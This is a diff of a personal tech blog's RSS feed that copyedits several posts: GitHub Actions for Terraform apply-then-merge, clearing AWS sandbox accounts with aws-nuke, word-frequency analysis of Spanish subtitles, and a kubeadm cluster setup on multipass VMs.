+<p>So now that the plan is working we need some way to <code>apply</code> the changes. I have
 found the best way to do this is via a label rather than a comment because of
-the way github actions work. Their event based actions like <code>on-comment</code> aren't
+the way github actions work. Their event based actions like <code>on-comment</code> are not
 executed in the context of a pull-request.</p>
 <p>Since we will be using a label to signal a plan is ready to be applied lets
 create a new file <code>.github/workflows/on-pull-request-labeled.yml</code> and provide
@@ -1500,10 +1500,10 @@ know the status.</p>
 <img src="/images/posts/aws_apply_before_merge/tfc_applying_comment.png" width="400">
 </center>
 <h1>Merge on Apply</h1>
-<p>One thing you'll notice is that the pull request stayed open even after the
-infrastructure is applied and we don't want that. We want any changes that have
+<p>One thing you will notice is that the pull request stayed open even after the
+infrastructure is applied and we do not want that. We want any changes that have
 made it into the environment to be merged into <code>main</code> automatically. To do
-this we'll create our final action.</p>
+this we will create our final action.</p>
 <p>Create a new file <code>.github/workflows/on-apply-finished.yml</code> with this content:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="yaml" data-theme="github-dark-dimmed"><code data-language="yaml" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#8DDB8C">name</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">pr_merge</span></span>
 <span data-line=""> </span>
@@ -1540,7 +1540,7 @@ this we'll create our final action.</p>
 <span data-line=""><span style="color:#8DDB8C">            github-token</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">${{ secrets.GITHUB_TOKEN }}</span></span>
 <span data-line=""><span style="color:#8DDB8C">            number</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">${{ steps.workflow-run-info.outputs.pullRequestNumber }}</span></span></code></pre></figure>
 <p>This will wait until the <code>pr_apply</code> job completes and as long as it was
-successful it'll merge the branch!</p>
+successful it will merge the branch!</p>
 <p><strong>NOTE</strong>: As I mentioned earlier, the event based actions do not run in the
 context of the pull request which means you cannot test changes to them during
 the PR either.  You must merge the <code>on-apply-finished.yml</code> file to <code>main</code>
@@ -1561,7 +1561,7 @@ protection rule:</p>
 <li>✅ Require a pull request before merging</li>
 <li>✅ Require status checks to pass before merging</li>
 </ul>
-<p>Then for <code>Status checks that are required.</code> select all of the ones we've
+<p>Then for <code>Status checks that are required.</code> select all of the ones we have
 created:</p>
 <center>
 <img src="/images/posts/aws_apply_before_merge/required_checks.png" height="200">
@@ -1578,13 +1578,13 @@ created:</p>
         </item>
         <item>
             <title><![CDATA[Wiping an AWS Account with aws-nuke]]></title>
-            <description><![CDATA[<p>When you're an SRE/DevOps engineer you'll end up making AWS accounts and
+            <description><![CDATA[<p>When you are an SRE/DevOps engineer you will end up making AWS accounts and
 create a lot of cruft in your sandbox and development accounts. AWS
 does not make it easy to clear these up but there is a tool called
 <a href="https://github.com/rebuy-de/aws-nuke">aws-nuke</a> that will do it for you!</p>
 <h1>Safe Guards</h1>
 <p>aws-nuke has a few safeguards in place to prevent inadvertent data loss.
-The first of which is it requires you to alias the targetted account. I
+The first of which is it requires you to alias the targeted account. I
 like to put <code>nuke</code> in the alias to make it clear.</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">aws</span><span style="color:#96D0FF"> iam</span><span style="color:#96D0FF"> create-account-alias</span><span style="color:#6CB6FF"> --account-alias</span><span style="color:#96D0FF"> nuke-</span><span style="color:#F47067">&#x3C;</span><span style="color:#96D0FF">accoun</span><span style="color:#ADBAC7">t</span><span style="color:#F47067">></span></span></code></pre></figure>
 <p>The second safe-guard is the config takes a key called <code>account-blocklist</code>
@@ -1667,10 +1667,10 @@ regions resources are deployed in.   To do this you can query the regions from A
 <span data-line=""><span style="color:#ADBAC7">  - </span><span style="color:#96D0FF">us-east-2</span></span>
 <span data-line=""><span style="color:#ADBAC7">  - </span><span style="color:#96D0FF">us-west-1</span></span>
 <span data-line=""><span style="color:#ADBAC7">  - </span><span style="color:#96D0FF">us-west-2</span></span></code></pre></figure>
-<p>I personally don't recommend targetting all AWS regions at the same time.  It
+<p>I personally do not recommend targeting all AWS regions at the same time.  It
 will generate a lot of output and be slow.  You could do it if necessary but
 most people only have a few regions they use and so they can set those directly.
-For example it, maybe you only use <code>us-</code> based regions?</p>
+For example, maybe you only use <code>us-</code> based regions?</p>
 <p>So lets run the dry-run and see what it wants to nuke:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws-nuke</span><span style="color:#6CB6FF"> -c</span><span style="color:#96D0FF"> nuke.yaml</span></span></code></pre></figure>
 <p>This should output something like:</p>
@@ -1702,7 +1702,7 @@ resource that should catch your eye that you probably do not want to delete:</p>
 <ul>
 <li><code>arn:aws:iam::777777777777:saml-provider/AWSSSO_254abb4071f10b25_DO_NOT_DELETE</code></li>
 </ul>
-<p>AWS clearly doesn't want us to delete that!</p>
+<p>AWS clearly does not want us to delete that!</p>
 <h1>Filters</h1>
 <p>To prevent nuke from deleting resources you want to keep you can define presets
 that you use on each account.  So with our SSO example we want to prevent it
@@ -1719,7 +1719,7 @@ from deleting those resources in a preset.</p>
 <span data-line=""><span style="color:#8DDB8C">      IAMRolePolicyAttachment</span><span style="color:#ADBAC7">:</span></span>
 <span data-line=""><span style="color:#ADBAC7">      - </span><span style="color:#8DDB8C">type</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"glob"</span></span>
 <span data-line=""><span style="color:#8DDB8C">        value</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"AWSReservedSSO_*"</span></span></code></pre></figure>
-<p>You can see in this example I'm targetting specific resource types and then
+<p>You can see in this example I am targeting specific resource types and then
 matching them with both <code>regex</code> and <code>glob</code> filter types. These are super
 powerful but a lot of times the simpler filters can be used.  I start with
 <code>contains</code> filter and then go from there:</p>
@@ -1779,9 +1779,9 @@ out:</p>
 <h1>Next steps</h1>
 <p>One final note about it is that it does not understand the relationship between
 resources and so it could try deleting an EBS volume that is still in use by an
-EC2 instance.  There isn't a great solution for this outside of running nuke a
+EC2 instance.  There is not a great solution for this outside of running nuke a
 few times.</p>
-<p>The tool is well documented and so you can find the rest of information going to
+<p>The tool is well documented and so you can find the rest of the information by going to
 <a href="https://github.com/rebuy-de/aws-nuke">https://github.com/rebuy-de/aws-nuke</a>!</p>]]></description>
             <link>https://sontek.net/blog/2023/nuking_aws_account</link>
             <guid isPermaLink="true">https://sontek.net/blog/2023/nuking_aws_account</guid>
@@ -1789,11 +1789,11 @@ few times.</p>
         </item>
         <item>
             <title><![CDATA[How to speak spanish like a colombian drug lord!]]></title>
-            <description><![CDATA[<p>I've been living in Puerto Rico for 4 years but two of those have been COVID and so I haven't been able to practice Spanish as much as I'd like. So to speed up my learning I've decided I want to watch a lot of spanish speaking television to start training my ears, but to do this I need a baseline of words I understand to be able to even know what they are saying!</p>
-<p>Learning through apps like Duolingo, Drops, etc start with weird topics like vegetables that don't get you to a very good baseline for actually understanding daily conversations, so I think consuming TV is a better use of my time.</p>
+            <description><![CDATA[<p>I have been living in Puerto Rico for 4 years but two of those have been COVID and so I have not been able to practice Spanish as much as I would like. So to speed up my learning I have decided I want to watch a lot of spanish speaking television to start training my ears, but to do this I need a baseline of words I understand to be able to even know what they are saying!</p>
+<p>Learning through apps like Duolingo, Drops, etc start with weird topics like vegetables that do not get you to a very good baseline for actually understanding daily conversations, so I think consuming TV is a better use of my time.</p>
 <h2>Subtitles</h2>
-<p>I've decided the way to understand what the best words to study are is to download every subtitle for every episode of a show I want to watch and then count each word.  The more a word is spoken the more important it is for me to know it since I'll be hearing it a lot in the show.</p>
-<p>I'm going to download subtitles from Netflix. Subtitles in Netflix are in WebVTT format, which looks like this:</p>
+<p>I have decided the way to understand what the best words to study are is to download every subtitle for every episode of a show I want to watch and then count each word.  The more a word is spoken the more important it is for me to know it since I will be hearing it a lot in the show.</p>
+<p>I am going to download subtitles from Netflix. Subtitles in Netflix are in WebVTT format, which looks like this:</p>
 <pre><code>248
 00:17:58.285 --> 00:18:01.163  position:50.00%,middle  align:middle size:80.00%  line:79.33% 
 Yo de verdad espero que ustedes
@@ -1809,7 +1809,7 @@ Yo nunca te vi como una madrastra.
 </code></pre>
 <p>It gives you a start time, end time, and the text on the screen.   So my first process was parsing this format and just turning it into a list of words using https://github.com/glut23/webvtt-py.</p>
 <h3>Dummy parsing</h3>
-<p>What I basically did was <code>text.split(" ")</code> and started counting the words.   This approach was quick and painless but it had a few downs falls.    Some words <em>look</em> the same when in reality they are not and so this meant I'd have to study every meaning of a word even if it was more rare.</p>
+<p>What I basically did was <code>text.split(" ")</code> and started counting the words.   This approach was quick and painless but it had a few downsides.    Some words <em>look</em> the same when in reality they are not and so this meant I would have to study every meaning of a word even if it was more rare.</p>
 <p>An example of this is the word "como", you can say:</p>
 <ul>
 <li>Haz como te digo: "Do as I say", where como means "as"</li>
@@ -1817,7 +1817,7 @@ Yo nunca te vi como una madrastra.
 </ul>
 <p>I need to know which version of a word is being used so I can count it properly.</p>
 <h3>Regular Expressions are always the answer</h3>
-<p>I couldn't figure out what the word was without it being in a complete sentence, but subtitles are fragments.   They are split up into timings for displaying on the screen but they don't include entire sentences.  For example, it might look like this:</p>
+<p>I could not figure out what the word was without it being in a complete sentence, but subtitles are fragments.   They are split up into timings for displaying on the screen but they do not include entire sentences.  For example, it might look like this:</p>
 <pre><code>23
 00:01:21.960 --> 00:01:23.520  position:50.00%,middle  align:middle size:80.00%  line:84.67% 
 Solo las que luchan por ellos
@@ -1826,24 +1826,24 @@ Solo las que luchan por ellos
 00:01:23.680 --> 00:01:25.680  position:50.00%,middle  align:middle size:80.00%  line:84.67% 
 consiguen sus sueños.
 </code></pre>
-<p>I want to detect the start of a sentence and the end of a sentence and then combine it, so that you end up with "Solo las que luchan por ellos consiguen sus sueños.".   My first thought was a regular expression on punctuation.   This worked well <em>most</em> of the time but there were enough exceptions to the rule that it broke often on generated a lot of broken sentences:</p>
+<p>I want to detect the start of a sentence and the end of a sentence and then combine it, so that you end up with "Solo las que luchan por ellos consiguen sus sueños.".   My first thought was a regular expression on punctuation.   This worked well <em>most</em> of the time but there were enough exceptions to the rule that it broke often and generated a lot of broken sentences:</p>
 <ul>
 <li>Abbreviations like "EE. UU" for estados unidos (united states)</li>
 <li>Ellipsis</li>
 </ul>
-<p>Splitting on spaces also didn't work for identifying the parts of speech since I needed the context around the word.</p>
+<p>Splitting on spaces also did not work for identifying the parts of speech since I needed the context around the word.</p>
 <center>
 <img src="/images/posts/learning_spanish/regex-extraction.png">
 </center>
 <h2>Natural Language Processing</h2>
 <p>So to solve my pain I decided to grab https://spacy.io/ and do some NLP on the subtitles so that I could identify the proper parts of speech and get an accurate representation of the words I needed to learn.</p>
-<p>The way spaCy works is you can send it a sentence and it'll return you a set of tokens:</p>
+<p>The way spaCy works is you can send it a sentence and it will return you a set of tokens:</p>
 <pre><code>>>> import spacy
 >>> nlp = spacy.load("es_core_news_sm")
 >>> [x.pos_ for x in nlp("Hola, como estas?")]
 ['PROPN', 'PUNCT', 'SCONJ', 'PRON', 'PUNCT']
 </code></pre>
-<p>So now I could identify the parts of speech and pull sentences together through end of sentence punctation.   The first thing I did was generate a CSV of sentences that looked like this:</p>
+<p>So now I could identify the parts of speech and pull sentences together through end of sentence punctuation.   The first thing I did was generate a CSV of sentences that looked like this:</p>
 <table>
 <tbody><tr>
 <th>sentence</th>
@@ -1916,11 +1916,11 @@ grouped_result.head(300)
 7	estar	37819
 8	el	35920
 </code></pre>
-<p>Now I wanted to identify where my diminishing returns would be.   Is there a set of words that I must learn because they are spoken so often that I wouldn't understand a conversation if they weren't in my vocabulary?</p>
+<p>Now I wanted to identify where my diminishing returns would be.   Is there a set of words that I must learn because they are spoken so often that I would not understand a conversation if they were not in my vocabulary?</p>
 <center>
 <img src="/images/posts/learning_spanish/diminishing_returns.png">
 </center>
-<p>As you can see in this chart, the usage for words drops off at around the ~200 mark.   So there are basically 150 words I <em>must</em> know and then the rest are equally important.   I wasn't quite happy with this because some parts of speech are higher priority than others, for example I think having a strong understanding of the popular verbs will go a long way.  So I also wanted to identify what are the most important verbs to learn:</p>
+<p>As you can see in this chart, the usage for words drops off at around the ~200 mark.   So there are basically 150 words I <em>must</em> know and then the rest are equally important.   I was not quite happy with this because some parts of speech are higher priority than others, for example I think having a strong understanding of the popular verbs will go a long way.  So I also wanted to identify what are the most important verbs to learn:</p>
 <pre><code>grouped_verbs = (words[words.pos == 'VERB'].groupby(['word', 'pos']).size() 
    .sort_values(ascending=False) 
    .reset_index(name='count')
@@ -2086,7 +2086,7 @@ p_df
 <td>Tarde para la ira</td>
 <td>75.59%</td>
 </tr></tbody></table>
-<p>But living in Puerto Rico, one thing I've realized is speed of speech is also important.  I have a much easier time speaking with people from Colombia and Mexico than I do with Puerto Ricans because they speak so much faster.   So even though I could understand 75% of "Tarde para la ira" if I learned the 200 words, I want to make sure they are speaking at a pace I could understand as well.</p>
+<p>But living in Puerto Rico, one thing I have realized is speed of speech is also important.  I have a much easier time speaking with people from Colombia and Mexico than I do with Puerto Ricans because they speak so much faster.   So even though I could understand 75% of "Tarde para la ira" if I learned the 200 words, I want to make sure they are speaking at a pace I could understand as well.</p>
 <p>So I loaded up the other CSV file that was the full sentences and added a "time per word" column:</p>
 <pre><code>sentences = pd.read_csv('sentences.csv.gz', compression='gzip', delimiter=',', parse_dates=['start', 'end'])
 sentences['total_time'] = (sentences['end'] - sentences['start']).dt.total_seconds()
@@ -2179,7 +2179,7 @@ sentence_group.time_per_word.mean().reset_index().sort_values('time_per_word')
 <td>La casa de las flores</td>
 <td>0.81</td>
 </tr></tbody></table>
-<p>Luckily the two series that have the least amount of vocabulary also speak the slowest!   So these will be the series I start with.    The final question I wanted to answer is "What are the top words I'm missing for a series".    Since I'll know 75% of the series from the top 200 words, I'm hoping there are some top words from a specific series that I can also learn to get an even higher understanding.</p>
+<p>Luckily the two series that have the least amount of vocabulary also speak the slowest!   So these will be the series I start with.    The final question I wanted to answer is "What are the top words I am missing for a series".    Since I will know 75% of the series from the top 200 words, I am hoping there are some top words from a specific series that I can also learn to get an even higher understanding.</p>
 <p>First, find which words are in each show but not in the top 200:</p>
 <pre><code>missing_words_by_show = {}
 
@@ -2210,7 +2210,7 @@ word	count
 <p>So adding those few words to my vocabulary will also give me a better understanding of the series.</p>
 <h2>Conclusion</h2>
 <p>I believe a data-driven approach to language learning will be an effective way to get me speaking better spanish.   It was a ton of fun to play with spaCy, pandas, and jupyter as well!</p>
-<p>I'll improve the data analysis over time as well but I do believe this is a pretty good starting point!</p>
+<p>I will improve the data analysis over time as well but I do believe this is a pretty good starting point!</p>
 <center>
 <img src="/images/posts/learning_spanish/meme.png">
 </center>]]></description>
@@ -2220,12 +2220,12 @@ word	count
         </item>
         <item>
             <title><![CDATA[Running a kubernetes cluster locally with kubeadm]]></title>
-            <description><![CDATA[<p>I’m going to show you how to get a real kubernetes cluster setup locally on top of virtual
-machines!  I’ll be using multipass but feel free to use virtualbox, proxmox, or whatever your
+            <description><![CDATA[<p>I am going to show you how to get a real kubernetes cluster setup locally on top of virtual
+machines!  I will be using multipass but feel free to use virtualbox, proxmox, or whatever your
 favorite cloud provider is.</p>
-<p>kubeadm a production ready kubernetes install tool and I prefer to use it over minikube, kind,
+<p>kubeadm is a production ready kubernetes install tool and I prefer to use it over minikube, kind,
 etc. because it gives you a more real world experience for <em>managing</em> the kubernetes cluster.
-This isn’t important if you are a user of the cluster but if you have to run your own this is
+This is not important if you are a user of the cluster but if you have to run your own this is
 a great way to gain some daily experience.</p>
 <p>The kubernetes documentation on kubeadm is great and you can find it <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/">here</a>.</p>
 <p>The differences between this blog and the kubernetes docs is that they leave a lot of decisions
@@ -2234,8 +2234,8 @@ up to the reader such as:</p>
 <li>choosing a container runtime</li>
 <li>Selecting and installing a CNI (container network interface)</li>
 </ul>
-<p>I’m going to be opinionated and make specific technology decisions such as using containerd and
-cilium so that you don't have to think about those decisions.</p>
+<p>I am going to be opinionated and make specific technology decisions such as using containerd and
+cilium so that you do not have to think about those decisions.</p>
 <h2>Getting your Virtual Machines setup!</h2>
 <p>The minimum requirements for a control plane node in kubernetes is 2gb of RAM and 2 CPUs.  Since
 we actually want to be able to schedule workloads on the workers afterwards we are going to setup
@@ -2244,16 +2244,16 @@ a cluster that looks like this:</p>
 <li>Control Plane: 2gb RAM, 2 CPU</li>
 <li>Worker: 4gb RAM, 2 CPU</li>
 </ul>
-<p>Since we’ll be using multipass to launch the nodes, we can do that now:</p>
+<p>Since we will be using multipass to launch the nodes, we can do that now:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> multipass</span><span style="color:#96D0FF"> launch</span><span style="color:#6CB6FF"> -c</span><span style="color:#6CB6FF"> 2</span><span style="color:#6CB6FF"> -m</span><span style="color:#96D0FF"> 4G</span><span style="color:#6CB6FF"> -d</span><span style="color:#96D0FF"> 10G</span><span style="color:#6CB6FF"> -n</span><span style="color:#96D0FF"> controlplane</span><span style="color:#6CB6FF"> 22.04</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> multipass</span><span style="color:#96D0FF"> launch</span><span style="color:#6CB6FF"> -c</span><span style="color:#6CB6FF"> 2</span><span style="color:#6CB6FF"> -m</span><span style="color:#96D0FF"> 4G</span><span style="color:#6CB6FF"> -d</span><span style="color:#96D0FF"> 10G</span><span style="color:#6CB6FF"> -n</span><span style="color:#96D0FF"> worker</span><span style="color:#6CB6FF"> 22.04</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> multipass</span><span style="color:#96D0FF"> list</span></span>
 <span data-line=""><span style="color:#F69D50">Name</span><span style="color:#96D0FF">                    State</span><span style="color:#96D0FF">             IPv4</span><span style="color:#96D0FF">             Image</span></span>
 <span data-line=""><span style="color:#F69D50">controlplane</span><span style="color:#96D0FF">            Running</span><span style="color:#6CB6FF">           192.168.64.7</span><span style="color:#96D0FF">     Ubuntu</span><span style="color:#6CB6FF"> 22.04</span><span style="color:#96D0FF"> LTS</span></span>
 <span data-line=""><span style="color:#F69D50">worker</span><span style="color:#96D0FF">                  Running</span><span style="color:#6CB6FF">           192.168.64.8</span><span style="color:#96D0FF">     Ubuntu</span><span style="color:#6CB6FF"> 22.04</span><span style="color:#96D0FF"> LTS</span></span></code></pre></figure>
-<p>Now we can start working on our controlplane first, lets shell in:</p>
+<p>Now we can start working on our controlplane first, let us shell in:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> multipass</span><span style="color:#96D0FF"> shell</span><span style="color:#96D0FF"> controlplane</span></span></code></pre></figure>
-<p>Lets first add the kubernetes repo to the system so we have access to all the kubernetes tools:</p>
+<p>Let us first add the kubernetes repo to the system so we have access to all the kubernetes tools:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> echo</span><span style="color:#96D0FF"> "deb  http://apt.kubernetes.io/  kubernetes-xenial  main"</span><span style="color:#F47067"> |</span><span style="color:#F69D50"> sudo</span><span style="color:#96D0FF"> tee</span><span style="color:#96D0FF"> /etc/apt/sources.list.d/kubernetes.list</span></span>
 <span data-line=""> </span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> curl</span><span style="color:#6CB6FF"> -fsSL</span><span style="color:#96D0FF">  https://packages.cloud.google.com/apt/doc/apt-key.gpg</span><span style="color:#F47067">|</span><span style="color:#F69D50">sudo</span><span style="color:#96D0FF"> gpg</span><span style="color:#6CB6FF"> --dearmor</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> /etc/apt/trusted.gpg.d/k8s.gpg</span></span>
@@ -2261,9 +2261,9 @@ a cluster that looks like this:</p>
 <p>Now that our system is setup, we can move on to getting a container runtime.</p>
 <h2>Getting your Container Runtime!</h2>
 <p>Before we start pulling in kubernetes components we need to get a container runtime setup on the
-machine.   We we are going to use containerd for this purpose.  You can view the docs of for it
+machine.   We are going to use containerd for this purpose.  You can view the docs of for it
 <a href="https://github.com/containerd/containerd/blob/main/docs/getting-started.md">here</a>.</p>
-<p>Which will download the latest binary and set it up.   I’m going to walk you through how to do it
+<p>Which will download the latest binary and set it up.   I am going to walk you through how to do it
 using the version packaged with Ubuntu which could be older than the latest release.</p>
 <p>First thing we want to do is configure the networking to allow iptables to manage:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> cat</span><span style="color:#F47067"> &#x3C;&#x3C;</span><span style="color:#ADBAC7">EOF</span><span style="color:#F47067"> |</span><span style="color:#F69D50"> sudo</span><span style="color:#96D0FF"> tee</span><span style="color:#96D0FF"> /etc/modules-load.d/k8s.conf</span></span>
@@ -2307,7 +2307,7 @@ net.ipv4.conf.lo.rp_filter = 0
 net.ipv4.conf.lxc0965b7b545f7.rp_filter = 0
 net.ipv4.conf.lxcb05ffd84ab74.rp_filter = 0
 </code></pre>
-<p>Now lets pull down the container runtime we’ll be using which is containerd.</p>
+<p>Now let us pull down the container runtime we will be using which is containerd.</p>
 <p>Ubuntu ships with a very old version of containerd so you need to upgrade to
 the version shipped from the docker repos:
 You can find which versions are available by running:</p>
@@ -2323,7 +2323,7 @@ You can find which versions are available by running:</p>
 <span data-line=""><span style="color:#F69D50">containerd.io</span><span style="color:#F47067"> |</span><span style="color:#F69D50">   1.5.10-1</span><span style="color:#F47067"> |</span><span style="color:#F69D50"> https://download.docker.com/linux/ubuntu</span><span style="color:#96D0FF"> jammy/stable</span><span style="color:#96D0FF"> arm64</span><span style="color:#96D0FF"> Packages</span></span></code></pre></figure>
 <p>We are going to use the latest version available which was 1.6.8-1</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> apt-get</span><span style="color:#96D0FF"> install</span><span style="color:#96D0FF"> containerd.io=1.6.8-1</span><span style="color:#6CB6FF"> -y</span></span></code></pre></figure>
-<p>Then we'll setup a configuration that enables containerd to use the systemd
+<p>Then we will setup a configuration that enables containerd to use the systemd
 cgroup.  We are hard coding this config instead of using <code>containerd config default</code>
 because that currently has had a <a href="https://github.com/containerd/containerd/issues/4574">bug</a>
 for many years that generates an invalid config.</p>
@@ -2340,12 +2340,12 @@ for many years that generates an invalid config.</p>
 <span data-line=""><span style="color:#ADBAC7">EOF</span></span>
 <span data-line=""> </span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> systemctl</span><span style="color:#96D0FF"> restart</span><span style="color:#96D0FF"> containerd.service</span></span></code></pre></figure>
-<p>You can verify its running with ctr:</p>
+<p>You can verify it is running with ctr:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> ctr</span><span style="color:#6CB6FF"> --address</span><span style="color:#96D0FF"> /var/run/containerd/containerd.sock</span><span style="color:#96D0FF"> containers</span><span style="color:#96D0FF"> list</span></span>
 <span data-line=""><span style="color:#F69D50">CONTAINER</span><span style="color:#96D0FF">    IMAGE</span><span style="color:#96D0FF">    RUNTIME</span></span></code></pre></figure>
 <p>Now that this is working we can move on to getting kubernetes installed!</p>
 <h2>Using kubeadm!</h2>
-<p>Now we need to get the kubernetes tools installed onto the system.  I’m going to be using 1.23
+<p>Now we need to get the kubernetes tools installed onto the system.  I am going to be using 1.23
 but to find the latest version you can run:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> apt-cache</span><span style="color:#96D0FF"> madison</span><span style="color:#96D0FF"> kubeadm</span><span style="color:#F47067">|</span><span style="color:#F69D50">head</span><span style="color:#6CB6FF"> -n2</span></span>
 <span data-line=""><span style="color:#F69D50">   kubeadm</span><span style="color:#F47067"> |</span><span style="color:#F69D50">  1.23.5-00</span><span style="color:#F47067"> |</span><span style="color:#F69D50"> http://apt.kubernetes.io</span><span style="color:#96D0FF"> kubernetes-xenial/main</span><span style="color:#96D0FF"> amd64</span><span style="color:#96D0FF"> Packages</span></span>
@@ -2362,17 +2362,17 @@ sure the versions align:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> mkdir</span><span style="color:#6CB6FF"> -p</span><span style="color:#ADBAC7"> $HOME</span><span style="color:#96D0FF">/.kube</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> cp</span><span style="color:#6CB6FF"> -i</span><span style="color:#96D0FF"> /etc/kubernetes/admin.conf</span><span style="color:#ADBAC7"> $HOME</span><span style="color:#96D0FF">/.kube/config</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> chown</span><span style="color:#ADBAC7"> $(</span><span style="color:#F69D50">id</span><span style="color:#6CB6FF"> -u</span><span style="color:#ADBAC7">)</span><span style="color:#96D0FF">:</span><span style="color:#ADBAC7">$(</span><span style="color:#F69D50">id</span><span style="color:#6CB6FF"> -g</span><span style="color:#ADBAC7">) $HOME</span><span style="color:#96D0FF">/.kube/config</span></span></code></pre></figure>
-<p>You can run those on the master node for now, but later I'll show you how to move
+<p>You can run those on the master node for now, but later I will show you how to move
 the config to your host computer.</p>
 <p>Now you should be able to check that your node is not ready yet:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> nodes</span></span>
 <span data-line=""><span style="color:#F69D50">NAME</span><span style="color:#96D0FF">           STATUS</span><span style="color:#96D0FF">     ROLES</span><span style="color:#96D0FF">                  AGE</span><span style="color:#96D0FF">     VERSION</span></span>
 <span data-line=""><span style="color:#F69D50">controlplane</span><span style="color:#96D0FF">   NotReady</span><span style="color:#96D0FF">   control-plane,master</span><span style="color:#96D0FF">   4m16s</span><span style="color:#96D0FF">   v1.23.5</span></span></code></pre></figure>
-<p><em>Note</em>: If you recieve "The connecto to the server was refused" error,
+<p><em>Note</em>: If you receive "The connection to the server was refused" error,
 The cluster starting up and getting all the dependencies running could take
-a bit of time.  So if you aren't able to communicate right away you can check
-which pods are up and running with <code>crictl</code>.  You'll need <code>kube-apiserver</code> up
-and running.  If it isn't you can check:</p>
+a bit of time.  So if you are not able to communicate right away you can check
+which pods are up and running with <code>crictl</code>.  You will need <code>kube-apiserver</code> up
+and running.  If it is not you can check:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> sudo</span><span style="color:#96D0FF"> crictl</span><span style="color:#6CB6FF"> --runtime-endpoint=unix:///var/run/containerd/containerd.sock</span><span style="color:#96D0FF"> ps</span><span style="color:#6CB6FF"> -a</span></span>
 <span data-line=""><span style="color:#F69D50">CONTAINER</span><span style="color:#96D0FF">           IMAGE</span><span style="color:#96D0FF">               CREATED</span><span style="color:#96D0FF">             STATE</span><span style="color:#96D0FF">               NAME</span><span style="color:#96D0FF">                      ATTEMPT</span><span style="color:#96D0FF">             POD</span><span style="color:#96D0FF"> ID</span><span style="color:#96D0FF">              POD</span></span>
